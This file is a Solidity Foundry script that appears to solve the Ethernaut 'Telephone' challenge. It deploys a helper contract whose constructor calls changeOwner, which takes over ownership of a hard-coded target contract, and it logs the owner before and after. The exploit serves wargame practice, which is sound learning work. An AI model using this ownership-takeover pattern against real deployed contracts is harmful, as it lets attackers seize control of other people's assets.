// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Telephone} from "../src/Telephone.sol";
import "forge-std/console.sol";
 
contract ContractCaller {
    constructor (Telephone _telephone, address _newOwner) {

        _telephone.changeOwner(_newOwner);
        

    }

}
    

contract TelephoneSolution is Script{

    Telephone public telephoneInstance = Telephone(0xfaa1bb9E690Ff7BcB35de2Ea74Bfd9419889d33e);

    function run() external {
        console.log("Old Contract Owner: ", telephoneInstance.owner());
        vm.startBroadcast();
        new ContractCaller(telephoneInstance, vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();

        console.log("Who send the transaction: ", msg.sender);

        console.log("New contract Owner: ", telephoneInstance.owner());

    }
}